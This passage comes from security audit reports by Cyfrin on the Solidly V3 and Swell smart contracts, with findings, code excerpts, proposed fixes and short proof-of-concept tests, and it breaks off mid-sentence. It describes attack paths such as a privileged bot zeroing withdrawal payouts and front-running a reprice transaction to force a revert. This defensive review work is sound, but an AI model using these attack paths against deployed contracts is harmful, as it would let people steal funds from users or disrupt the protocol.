**Description:** [`RewardsDistributor::setOwner`](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L459-L462) and [`SolidlyV3Factory::setOwner`](https://github.com/SolidlyV3/v3-core/blob/callbacks/contracts/SolidlyV3Factory.sol#L60-L64) allow the current owner to brick the ownership by setting `owner = address(0)`, which would prevent future access to admin functionality. Prefer an explicit function for renouncing ownership to prevent this occurring by mistake and prefer a 2-step ownership transfer mechanism. Both of these features are available in OZ [Ownable2Step](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol).

**Solidly:**
Acknowledged.


### `require` and`revert`statements should have descriptive reason strings

**Description:** `require` and`revert`statements should have descriptive reason strings:

```solidity
File: SolidlyV3Factory.sol

46:         require(tokenA != tokenB);

48:         require(token0 != address(0));

50:         require(tickSpacing != 0);

51:         require(getPool[token0][token1][tickSpacing] == address(0));

61:         require(msg.sender == owner);

68:         require(msg.sender == owner);

75:         require(msg.sender == owner);

88:         require(msg.sender == owner);

89:         require(fee <= 100000);

94:         require(tickSpacing > 0 && tickSpacing < 16384);

95:         require(feeAmountTickSpacing[fee] == 0);

```

```solidity
File: SolidlyV3Pool.sol

116:         require(success && data.length >= 32);

127:         require(success && data.length >= 32);

302:         require(amount > 0);

327:         require(amount > 0);

947:         require(fee <= 100000);

```

```solidity
File: libraries/FullMath.sol

34:             require(denominator > 0);

43:         require(denominator > prod1);

120:             require(result < type(uint256).max);

```

```solidity
File: RewardsDistributor.sol

564:        require(sent);

595:        require(success && data.length >= 32);

```

**Solidly:**
Acknowledged.


### Functions not used internally could be marked external

**Description:** Functions not used internally could be marked external:

```solidity
File: SolidlyV3Factory.sol

87:     function enableFeeAmount(uint24 fee, int24 tickSpacing) public override {

```

**Solidly:**
Acknowledged.


### Refactor `zeroRoot` declared in multiple functions into a private constant

**Description:** `zeroRoot` is declared and used in `RewardsDistributor::pauseClaimsGovernance` [L546](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L546) and `pauseClaimsPublic` [L554](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L554). Consider refactoring it into a private constant to avoid declaring it in multiple functions.

**Solidly:**
Fixed in commit [653c196](https://github.com/SolidlyV3/v3-rewards/commit/653c19659474c93ef0958479191d8103bc7b7e82).

**Cyfrin:**
Verified.


### Hard-coded pause collateral fee not appropriate for multi-chain usage

**Description:** As Solidly aims to be multi-chain in the future, [hard-coding](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L553) a pause collateral fee of 5 ether in `RewardsDistributor::pauseClaimsPublic` may not be appropriate on other chains as this amount would represent very little value. Consider having a `public` storage variable for the pause collateral fee and an `onlyOwner` function to set it.

**Solidly:**
Fixed in commit [653c196](https://github.com/SolidlyV3/v3-rewards/commit/653c19659474c93ef0958479191d8103bc7b7e82).

**Cyfrin:**
Verified.


### `RewardsDistributor::_claimSingle` should emit `RewardClaimed` using `amountDelta`

**Description:** In `RewardsDistributor::_claimSingle`, the `amount` parameter gets subtracted from the `previouslyClaimed` parameter. Consider the case where a user is entitled to 10 reward tokens.

The user claims their 10 tokens.

Then later on the user becomes entitled to another 10 tokens for the same pool/token/type (`rewardKey`). If the user tries to claim with `amount = 10` this would now fail; the user must claim with `amount = 20` to pass the subtraction of the previously claimed amount.

This design seems kind of confusing; users have to keep track of the total amount they have claimed, then add to that the new amount they can claim, and call claim with that total amount.

Even though only the difference `amountDelta` is sent to the user, the `RewardClaimed` event is emitted with `amount`. So in the above scenario there would be two `RewardClaimed` events emitted with `amount (10)` and `amount(20)` even though the user only received 20 total reward tokens.

Consider refactoring this function such that users can simply call it with the amount they are entitled to claim, or at least changing the event emission to use `amountDelta` instead of `amount`.

**Solidly:**
Acknowledged.


### `CollateralWithdrawn` and `CollateralDeposited` events should include relevant amounts

**Description:** In `RewardsDistributor::withdrawCollateral` add the `_amount` parameter when emitting the `CollateralWithdrawn` event. This is required as the amount sent does not have to be the same as the amount deposited.

Consider adding the amount deposited to the `CollateralDeposited` event as well, since the required collateral amount could be changed meaning that the current value may not be true for every collateral deposit that has occurred.

**Solidly:**
Fixed in commit [6481747](https://github.com/SolidlyV3/v3-rewards/commit/6481747737b98c8650a36f87b1aeace815505ba9).

**Cyfrin:**
Verified.

\clearpage
## Gas Optimization


### Cache array length outside of loop

**Description:** Cache array length outside of loop:

```solidity
File: contracts/RewardsDistributor.sol
// @audit use `numLeaves` from L263 instead of `earners.length`
265:         for (uint256 i; i < earners.length; ) {
```

**Solidly:**
Fixed in commit [6481747](https://github.com/SolidlyV3/v3-rewards/commit/6481747737b98c8650a36f87b1aeace815505ba9).

**Cyfrin:**
Verified.


### Don't initialize variables with default value

**Description:** Don't initialize variables with default value:

```solidity
File: contracts/RewardsDistributor.sol

184:         for (uint256 i = 0; i < numClaims; ) {

```

```solidity
File: libraries/TickMath.sol

67:         uint256 msb = 0;

```

**Solidly:**
Fixed in commit [6481747](https://github.com/SolidlyV3/v3-rewards/commit/6481747737b98c8650a36f87b1aeace815505ba9) for `RewardsDistributor`; v3-core is already deployed and not upgradeable.

**Cyfrin:**
Verified.


### Prefer `++x` to `x++`

**Description:** Prefer `++x` to `x++`:

File: `TickBitmap.sol`
```solidity
48:        if (tick < 0 && tick % tickSpacing != 0) compressed--; // round towards negative infinity
```

File: `SolidlyV3Pool.sol`
```solidity
965:            if (amount0 == poolFees.token0) amount0--; // ensure that the slot is not cleared, for gas savings
```

File: `SolidlyV3Pool.sol`
```solidity
970:            if (amount1 == poolFees.token1) amount1--; // ensure that the slot is not cleared, for gas savings
```

File: `FullMath.sol`
```solidity
120:            result++;
```

**Solidly:**
Acknowledged.


### Cache storage variables in memory when read multiple times without being changed

**Description:** Cache storage variables in memory when read multiple times without being changed:

File: `SolidlyV3Pool.sol`
```solidity
// @audit no need to load `slot0.fee` twice from storage since it doesn't change;
// load from storage once into memory then use in-memory copy
913:        uint256 fee0 = FullMath.mulDivRoundingUp(amount0, slot0.fee, 1e6);
914:        uint256 fee1 = FullMath.mulDivRoundingUp(amount1, slot0.fee, 1e6);


// @audit `poolFees.token0` and `poolFees.token1` are read from storage multiple times
// but don't get changed until L966 & L971. Load them both from storage once into memory
// then use the in-memory copy instead of repeatedly reading the same value from storage
961:        amount0 = amount0Requested > poolFees.token0 ? poolFees.token0 : amount0Requested;
962:        amount1 = amount1Requested > poolFees.token1 ? poolFees.token1 : amount1Requested;

964:        if (amount0 > 0) {
965:            if (amount0 == poolFees.token0) amount0--; // ensure that the slot is not cleared, for gas savings
966:            poolFees.token0 -= amount0;
967:            TransferHelper.safeTransfer(token0, recipient, amount0);
968:        }
969:        if (amount1 > 0) {
970:            if (amount1 == poolFees.token1) amount1--; // ensure that the slot is not cleared, for gas savings
971:            poolFees.token1 -= amount1;
972:            TransferHelper.safeTransfer(token1, recipient, amount1);
973:        }
```

File: `SolidlyV3Factory.sol`
```solidity
// @audit `owner` is read from storage twice returning the same value each time. Read it from
// storage once into memory, then use the in-memory copy both times
61:        require(msg.sender == owner);
62:        emit OwnerChanged(owner, _owner);
```

**Solidly:**
Acknowledged.


### Use multiple requires instead of a single one with multiple statements is better for gas consumption

**Description:** Use multiple requires instead of a single one with multiple `&&` is better for gas consumption. The reason is because `require` is translated as [revert which does not consume gas](https://ethereum-org-fork.netlify.app/developers/docs/evm/opcodes) if it reverts. However `&&` consume gas. Therefore, opting for multiple require is more gas efficient than opting for a single one with multiple statements that mus be true.

```solidity
// SolidlyV3Pool.sol
116:    require(success && data.length >= 32);
127:    require(success && data.length >= 32);
278:    require(amount0 >= amount0Min && amount1 >= amount1Min, 'AL');
293:    require(amount0 >= amount0Min && amount1 >= amount1Min, 'AL');
391:     require(amount0FromBurn >= amount0FromBurnMin && amount1FromBurn >= amount1FromBurnMin, 'AL');
456:    require(amount0 >= amount0Min && amount1 >= amount1Min, 'AL');

// RewardsDistributor.sol
607:    require(success && data.length >= 32);
```

**Solidly:**
Acknowledged.


### Optimize away two memory variables in `RewardsDistributor::generateLeaves`

**Description:** Optimize away two memory variables in `RewardsDistributor::generateLeaves` by using a named return variable and removing the temporary `leaf` variable:

```solidity
function _generateLeaves(
    address[] calldata earners,
    EarnedRewardType[] calldata types,
    address[] calldata pools,
    address[] calldata tokens,
    uint256[] calldata amounts
) private pure returns (bytes32[] memory leaves) {
    uint256 numLeaves = earners.length;
    // @audit using named return variable
    leaves            = new bytes32[](numLeaves);

    // @audit using cached array length in loop
    for (uint256 i; i < numLeaves; ) {
        // @audit assign straight to return variable
        leaves[i] = keccak256(
            bytes.concat(
                keccak256(
                    abi.encode(
                        earners[i],
                        types[i],
                        pools[i],
                        tokens[i],
                        amounts[i]
                    )
                )
            )
        );
        unchecked {
            ++i;
        }
    }
    return leaves;
}
```

**Solidly:**
Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-01-24-cyfrin-solidlyV3.md ------


------ FILE START car/reports_md/2024-02-23-cyfrin-swell-barracuda.md ------

**Lead Auditors**

[Dacian](https://twitter.com/DevDacian)

[Carlitox477](https://twitter.com/carlitox477)

**Assisting Auditors**



---

# Findings
## Medium Risk


### `SwellLib.BOT` can delete active validators when bot methods are paused

**Description:** Almost all of the functions callable by `SwellLib.BOT` contain the following check to prevent bot functions from working when bot methods are paused:

```solidity
if (AccessControlManager.botMethodsPaused()) {
  revert SwellLib.BotMethodsPaused();
}
```

The one exception is [`NodeOperatorRegistry::deleteActiveValidators`](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/NodeOperatorRegistry.sol#L417-L423) which is callable by `SwellLib.BOT` even when bot methods are paused. Consider:
* adding a similar check to this function such that `SwellLib.BOT` is not able to call it when bot methods are paused
* alternatively add an explicit comment to this function stating that it should be callable by `SwellLib.BOT` even when bot methods are paused.

One possible implementation for the first solution:
```solidity
bool isBot = AccessControlManager.hasRole(SwellLib.BOT, msg.sender);

// prevent bot from calling this function when bot methods are paused
if(isBot && AccessControlManager.botMethodsPaused()) {
  revert SwellLib.BotMethodsPaused();
}

// function only callable by admin & bot
if (!AccessControlManager.hasRole(SwellLib.PLATFORM_ADMIN, msg.sender) && !isBot) {
  revert OnlyPlatformAdminOrBotCanDeleteActiveValidators();
}
```

**Swell:** Fixed in commit [1a105b7](https://github.com/SwellNetwork/v3-contracts-lst/commit/1a105b76899780e30b1fb88abdede11c0c0586ba).

**Cyfrin:**
Verified.


### `SwellLib.BOT` can subtly rug-pull withdrawals by setting `_processedRate = 0` when calling `swEXIT::processWithdrawals`

**Description:** When users create a withdrawal request, their `swETH` is [burned](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L202-L205) then the current exchange rate `rateWhenCreated` is [fetched](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L213) from `swETH::swETHToETHRate`:
```solidity
uint256 rateWhenCreated = AccessControlManager.swETH().swETHToETHRate();
```

However `SwellLib.BOT` can [pass an arbitrary value](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L111) for `_processedRate` when calling `swEXIT::processWithdrawals`:
```solidity
function processWithdrawals(
  uint256 _lastTokenIdToProcess,
  uint256 _processedRate
) external override checkRole(SwellLib.BOT) {
```

The [final rate](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L150-L152) used is the lesser of `rateWhenCreated` and `_processedRate`:
```solidity
uint256 finalRate = _processedRate > rateWhenCreated
  ? rateWhenCreated
  : _processedRate;
```

This final rate is [multiplied](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L158) by the requested withdrawal amount to determine the actual amount sent to the user requesting a withdrawal:
```solidity
uint256 requestExitedETH = wrap(amount).mul(wrap(finalRate)).unwrap();
```

Hence `SwellLib.BOT` can subtly rug-pull all withdrawals by setting `_processedRate = 0` when calling `swEXIT::processWithdrawals`.

**Recommended Mitigation:** Two possible mitigations:
1) Change `swEXIT::processWithdrawals` to always fetch the current rate from `swETH::swETHToETHRate`
2) Only allow `swEXIT::processWithdrawals` to be called by the `RepricingOracle` contract which [calls it correctly](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L130-L132).

**Swell:** Fixed in commits [c6f8708](https://github.com/SwellNetwork/v3-contracts-lst/commit/c6f870847bdf276aee1bf9aeb1ed71771a2aba04), [64cfbdb](https://github.com/SwellNetwork/v3-contracts-lst/commit/64cfbdbf67e28d84f2a706982e28925ab51fd5e6).

**Cyfrin:**
Verified.

\clearpage
## Low Risk


### Precision loss in `swETH::reprice` from unnecessary division before multiplication

**Description:** `swETH::reprice` [L281-286](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L281-L286) performs unnecessary [division before multiplication](https://dacian.me/precision-loss-errors#heading-division-before-multiplication) when calculating node operator rewards which negatively impacts node operator rewards due to precision loss:

```solidity
UD60x18 nodeOperatorRewardPortion = wrap(nodeOperatorRewardPercentage)
  .div(wrap(rewardPercentageTotal));

nodeOperatorRewards = nodeOperatorRewardPortion
  .mul(rewardsInSwETH) // @audit mult after division
  .unwrap();
```

Refactor to perform division after multiplication:

```solidity
nodeOperatorRewards = wrap(nodeOperatorRewardPercentage)
  .mul(rewardsInSwETH)
  .div(wrap(rewardPercentageTotal))
  .unwrap();
```

A similar issue occurs when calculating operators reward share [L310-313](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L310-L313):

```solidity
uint256 operatorsRewardShare = wrap(operatorActiveValidators)
  .div(totalActiveValidators)
  .mul(wrap(nodeOperatorRewards)) // @audit mult after division
  .unwrap();
```

This can be similarly refactored to prevent the precision loss by performing multiplication first:

```solidity
uint256 operatorsRewardShare = wrap(operatorActiveValidators)
  .mul(wrap(nodeOperatorRewards))
  .div(totalActiveValidators)
  .unwrap();
```

This issue has not been introduced in the new changes but is in the mainnet code ([1](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L267-L272), [2](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L296-L299)).

There is still one potential precision loss remaining as `rewardsInSwETH` which has had a [division performed](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L239) then gets [multiplied](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L285) but attempting to refactor this out resulted in a "stack too deep" error so it may be unavoidable.

**Swell:** Acknowledged.


### `swEXIT::setWithdrawRequestMaximum` and `setWithdrawRequestMinimum` lacking validation can lead to a state where `withdrawRequestMinimum > withdrawRequestMaximum`

**Description:** Invariant `withdrawRequestMinimum <= withdrawRequestMaximum` must always hold, however this is not checked when new min/max withdraw values are set. Hence it is possible to enter a non-sensical state where `withdrawRequestMinimum > withdrawRequestMaximum`.

**Recommended mitigation:**
```diff
  function setWithdrawRequestMaximum(
    uint256 _withdrawRequestMaximum
  ) external override checkRole(SwellLib.PLATFORM_ADMIN) {
+   require(withdrawRequestMinimum <= _withdrawRequestMaximum);

    emit WithdrawalRequestMaximumUpdated(
      withdrawRequestMaximum,
      _withdrawRequestMaximum
    );
    withdrawRequestMaximum = _withdrawRequestMaximum;
  }

  function setWithdrawRequestMinimum(
    uint256 _withdrawRequestMinimum
  ) external override checkRole(SwellLib.PLATFORM_ADMIN) {
+   require(_withdrawRequestMinimum <= withdrawRequestMaximum);

    emit WithdrawalRequestMinimumUpdated(
      withdrawRequestMinimum,
      _withdrawRequestMinimum
    );
    withdrawRequestMinimum = _withdrawRequestMinimum;
  }
```

**Swell:** Fixed in commit [a9dfe5c](https://github.com/SwellNetwork/v3-contracts-lst/commit/a9dfe5cef35404e4e957e8001d571b1cf43feb0a).

**Cyfrin:**
Verified.


### `swExit::getProcessedRateForTokenId` returns `true` with valid `processedRate` for non-existent `tokenId` input

**Description:** `swExit::getProcessedRateForTokenId` returns `true` with valid `processedRate` for non-existent `tokenId` input.

**Impact:** This `public` function can return valid output for invalid input. Currently it only appears to be used by `finalizeWithdrawal` where this behavior does not seem to be further exploitable as that function checks for non-existent tokens before calling `getProcessedRateForTokenId`.

**Proof of Concept:** Add the following PoC to `getProcessedRateForTokenId.test.ts`:
```typescript
  it("Should return false for isProcessed when tokens have been processed but this token doesn't exist", async () => {
    await createWithdrawRequests(Deployer, 5);

    await swEXIT_Deployer.processWithdrawals(4, parseEther("1"));

    // @audit this test fails
    expect(await getProcessedRateForTokenId(0)).eql({
      isProcessed: false,               // @audit returns true
      processedRate: BigNumber.from(0), // @audit returns > 0
    });
  });
```

**Recommended Mitigation:** `swExit::getProcessedRateForTokenId` should `return(false, 0)` when `tokenId` doesn't exist. It appears that the only edge case which is currently unhandled by this function is when `tokenId = 0`.

**Swell:** Fixed in commits [4c8cbfd](https://github.com/SwellNetwork/v3-contracts-lst/commit/4c8cbfde6fdb54385f8bab83c33f90409fd0a412), [262db73](https://github.com/SwellNetwork/v3-contracts-lst/commit/262db7361f543611237e889313b8022a47b77144).

**Cyfrin:**
Verified.


### Check for staleness of data when fetching Proof of Reserves via Chainlink `Swell ETH PoR` Oracle

**Description:** `RepricingOracle::_assertRepricingSnapshotValidity` [uses](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L329-L331) the `Swell ETH PoR` Chainlink Proof Of Reserves Oracle to fetch an off-chain data source for Swell's current reserves.

The Oracle `Swell ETH PoR` is [listed](https://docs.chain.link/data-feeds/proof-of-reserve/addresses?network=ethereum&page=1#networks) on Chainlink's website as having a heartbeat of `86400` seconds (check the "Show More Details" box in the top-right corner of the table), however [no staleness check](https://medium.com/SwellNetwork/chainlink-oracle-defi-attacks-93b6cb6541bf#99af) is implemented by `RepricingOracle`:
```solidity
// @audit no staleness check
(, int256 externallyReportedV3Balance, , , ) = AggregatorV3Interface(
  ExternalV3ReservesPoROracle
).latestRoundData();
```

**Impact:** If the `Swell ETH PoR` Chainlink Proof Of Reserves Oracle has stopped functioning correctly, `RepricingOracle::_assertRepricingSnapshotValidity` will continue processing with stale reserve data as if it were fresh.

**Recommended Mitigation:** Implement a staleness check and if the Oracle is stale, either revert or skip using it as the code currently does [if the oracle is not set](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L325-L327).

For multi-chain deployments ensure that a [correct staleness check is used for each feed](https://medium.com/SwellNetwork/chainlink-oracle-defi-attacks-93b6cb6541bf#fb78) as the same feed can have different heartbeats on different chains.

Consider adding an off-chain bot that periodically checks if the Oracle has become stale and if it has, raises an internal alert for the team to investigate.

**Swell:** Fixed in commit [84a6517](https://github.com/SwellNetwork/v3-contracts-lst/commit/84a65178c31222d80559f6fd5f1b4c60f9249016).

**Cyfrin:**
Verified.


### `swETH::reprice` may run out of gas or become exorbitantly expensive when scaling to large number of validator operators due to iterating over them all

**Description:** `swETH::reprice` [loops](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L303-L321) through all validator operators to pay out their share of rewards:
```solidity
// @audit may run out of gas for larger number of validator operators
// or make repricing exorbitantly expensive
for (uint128 i = 1; i <= totalOperators; ) {
  (
    address rewardAddress,
    uint256 operatorActiveValidators
  ) = nodeOperatorRegistry.getRewardDetailsForOperatorId(i);

  if (operatorActiveValidators != 0) {
    uint256 operatorsRewardShare = wrap(operatorActiveValidators)
      .div(totalActiveValidators)
      .mul(wrap(nodeOperatorRewards))
      .unwrap();

    _transfer(address(this), rewardAddress, operatorsRewardShare);
  }

  // Will never overflow as the total operators are capped at uint128
  unchecked {
    ++i;
  }
}
```
If Swell scales to a large number of validators `swETH::reprice` may revert due to out of gas or make the reprice operation exorbitantly expensive. `NodeOperatorRegistry::getNextValidatorDetails` may be similarly [affected](https://github.com/SwellNetwork/v3-contracts-lst/blob/c9a1e6c06d0f5b358f5c3d4b7644db7a33952444/contracts/implementations/NodeOperatorRegistry.sol#L117-L125).

Currently this represents a low risk for Swell as the protocol uses a small set of ["permissioned group of professional node operators"](https://docs.swellnetwork.io/swell/sweth-liquid-staking/sweth-v1.0-system-design/node-operators-set).

However Swell intends to [transition away from](https://docs.swellnetwork.io/swell/sweth-liquid-staking/sweth-v1.0-system-design/node-operators-set) this: _"The subsequent iterations will see the operator set **expand** and ultimately be permissionless.."_

As Swell expands the operator set this issue will become a more serious concern and may require mitigation.

**Swell:** Acknowledged.


### `NodeOperatorRegistry::updateOperatorControllingAddress` allows to override `_newOperatorAddress` if its address is already assigned to an operator ID

**Description:** Current implementation does not check if the new assigned address has already been assigned to an operator ID. As a consequence, its current value can be over written in mapping `getOperatorIdForAddress`, and `getOperatorForOperatorId` will have 2 operator IDs pointing to the same operator.

The direct consequences of this are on `_getOperatorSafe` and `_getOperatorIdSafe`, which will only return data for the new assigned operator ID.

Therefore:
* `NodeOperatorRegistry::getOperatorsPendingValidatorDetails` won't be able to return old `_newOperatorAddress` associated validators details
* `NodeOperatorRegistry::getOperatorsActiveValidatorDetails` won't be able to return old `_newOperatorAddress` associated active validators details
* `enableOperator` won't be able to enable old operator record
* **__`disableOperator` won't be able to disable old operator record__**.  This can affect function `usePubKeysForValidatorSetup` given that the protocol won't be able to disable already enabled public key to be used for validator setup given that there is no way to modify previous `getOperatorForOperatorId[_newOperatorAddress].enabled` storage and [force the function to revert](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/NodeOperatorRegistry.sol#L194-L196). Given that the only one allowed to call the function is the BOT by previously calling `DepositManager::setupValidators` the impact is limited.
* `updateOperatorRewardAddress` won't be able to modify reward address from old operator record
* `updateOperatorName` won't be able to modify name from old operator record

This issue has not been introduced in the new changes but is in the mainnet [code](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/NodeOperatorRegistry.sol#L348-L364).

**Proof Of Concept:**
Add the following test to `updateOperatorFields.test.ts`:
```typescript
    it("Should revert updating operator controlling address to existing address", async () => {
      // create another operator
      await NodeOperatorRegistry_Deployer.addOperator(
        "OPERATOR_2",
        NewOperator.address,
        NewOperator.address
      );

      // attempt to update first operator's controlling address to be
      // the same as the newly created operator - should revert but doesn't
      await NodeOperatorRegistry_Deployer.updateOperatorControllingAddress(
        Operator.address,
        NewOperator.address
      );
    });
```

**Recommended mitigation:**
Check that `_newOperatorAddress` is not already assigned to an operator (similar to `addOperator` which [already does this](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/NodeOperatorRegistry.sol#L300-L302), may wish to create a new private or public function for code reuse):
```diff
  function updateOperatorControllingAddress(
    address _operatorAddress,
    address _newOperatorAddress
  )
    external
    override
    checkRole(SwellLib.PLATFORM_ADMIN)
    checkZeroAddress(_newOperatorAddress)
  {

    if (_operatorAddress == _newOperatorAddress) {
        revert CannotSetOperatorControllingAddressToSameAddress();
    }
+   if(getOperatorIdForAddress[_newOperatorAddress] != 0){
+       revert CannotUpdateOperatorControllingAddressToAlreadyAssignedAddress();
+   }

    uint128 operatorId = _getOperatorIdSafe(_operatorAddress);

    getOperatorIdForAddress[_newOperatorAddress] = operatorId;
    getOperatorForOperatorId[operatorId]
      .controllingAddress = _newOperatorAddress;

    delete getOperatorIdForAddress[_operatorAddress];
  }
```

**Swell:** Fixed in commit [55c7d5f](https://github.com/SwellNetwork/v3-contracts-lst/commit/55c7d5fba6d55c68558dcd15de016927e07e38fd).

**Cyfrin:**
Verified.


### Allowing anyone to finalize any withdrawal can lead to integration problems for smart contract allowed to receive ETH

**Description:** Current implementation of `swEXIT::finalizeWithdrawal` allows anyone to finalize any withdrawal request which is already processed. However this design decision make the strong assumption that an NFT owner always wants to finalize a withdrawal, which might not be always the case.

**Impact:** Allowing anyone to finalize any withdrawal request already processed can lead to stuck ETH in some smart contracts

**POC:**
Assume a protocol which goals is facilitating NFT auctions, with auctions that can accept any token or ETH. Bidders has a record for the amount of tokens/ETH they are offering for an NFT, so the smart contract implement a `receive` function to accept ETH.

Eve initiate a withdrawal request, but given that she urge for ETH she decide to use this protocol to sell her NFT in an auction. To do this, she must transfer the NFT to the auction contract.

Alice decide to bid for the NFT, and at the end of the auction she wins, now she has to claim the NFT (the auction contract is the owner of the NFT right now).

The swEXIT NFT is processed before Alice intend to claim it, Eve calls `finalizeWithdrawal` with the NFT in the auction contract, given that this contract is allowed to receive ETH and it is the NFT owner the transaction does not revert, and the ETH associated to the NFT now is stuck forever in the auction contract, Alice cannot claim nothing now.

**Recommended Mitigation:** Only allowed the owner of the NFT to finalize a withdrawal

```diff
    function finalizeWithdrawal(uint256 tokenId) external override {
        if (AccessControlManager.withdrawalsPaused()) {
        revert WithdrawalsPaused();
        }

        address owner = _ownerOf(tokenId);

-       if (owner == address(0)) {
-           revert WithdrawalRequestDoesNotExist();
+       if (owner == msg.sender) {
+           revert WithdrawalRequestFinalizationOnlyAllowedForNFTOwner();
        }
```

**Swell:** Fixed in commit [b5d7a19](https://github.com/SwellNetwork/v3-contracts-lst/commit/b5d7a19e2f6de5c0ae086c8deaac5166767cd3fd).

**Cyfrin:**
Verified.


### Multiple attack paths to force `swETH::reprice` to revert by increasing or decreasing swETH total supply

**Description:** The current total swETH supply is [used](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L268-L273) in `swETH::reprice` to enforce the maximum allowed total swETH supply difference during repricings. Total supply can decrease for 2 reasons:
1. [Withdrawal being finalized](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L205)
2. User calls [`swETH::burn`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L350-L356) to burn their own swETH

Total supply can also increase by users calling `swETH::deposit`.

The closer the current supply difference is to the maximum tolerated difference percentage, the greater chance an attacker can front-run the repricing transaction causing it to revert by:
1. Depositing a large enough amount of ETH via `swETH::deposit` to increase total supply
2. Burning their own swETH to decrease total supply
3. Finalizing one or more withdrawals (users can finalize others withdrawals) to decrease total supply

**Recommended mitigation:**
Some possible mitigations include:
* Add a burner role and assigned it only to `swEXIT`, also add the corresponding modifier to check this role to `swETH::burn`
* Only allow the owner of an NFT to finalize their owned withdrawal requests

However these potential mitigations restrict functionality while still enabling an attacker to revert the reprice via the `swETH::deposit` route. Another option would be to have the bot perform the repricing transaction through a service such as [flashbots](https://www.flashbots.net/) such that the transaction can't be front-run; this would prevent all of the attack paths while still preserving the ability for users to burn their swETH and to finalize others withdrawals.

**Swell:** Using flashbots to perform repricing transactions.


### Rewards unable to be distributed when all active validators are deleted during repricing

**Description:** Invariant fuzzing found an interesting edge-case during repricing if:

1) there are rewards to distribute which were accrued in the last period,
2) all the current active validators are being deleted in the repricing operation

Because the validators are [deleted first](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L114-L122) the reprice transaction reverts with `NoActiveValidators` [error](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L298-L300).

No repricings will be possible until new active validators are added, and when that occurs the new validators will receive the rewards that were generated by the old validators which were deleted. Additionally Aaron confirmed on TG: _it is theoretically possible for fees to be generated without any active validators as any ETH sent to the `DepositManager` is considered rewards and eligible for fees._

**Recommended Mitigation:** During repricing if there are no active validators but rewards to be distributed, instead of reverting the rewards should go to the Swell treasury.

**Swell:** Fixed in commit [5594e20](https://github.com/SwellNetwork/v3-contracts-lst/commit/5594e204083a8507e69f0c28f4d1d7162f9a20fd).

**Cyfrin:**
Verified.


### Repricing with small rewards results in an invalid state where `ETH` reserves increase, `swETH to ETH` exchange rate increases, but no rewards are paid out to operators or treasury

**Description:** Invariant fuzzing used repricings with small rewards to reach an invalid state where `ETH` reserves increase, `swETH : ETH` exchange rate increases, but no rewards are paid out to operators or treasury.

**Proof of Concept:** During repricing:
1) there is no minimum value enforced by either `RepricingOracle` for [`_snapshot.rewardsPayableForFees`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L227) or `swETH::reprice` for `_newETHRewards`
2) in `swETH::reprice` there is no check for rounding down to zero precision loss when [calculating](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L239-L241) `rewardsInSwETH`

This results in the fuzzer reaching an invalid state where:
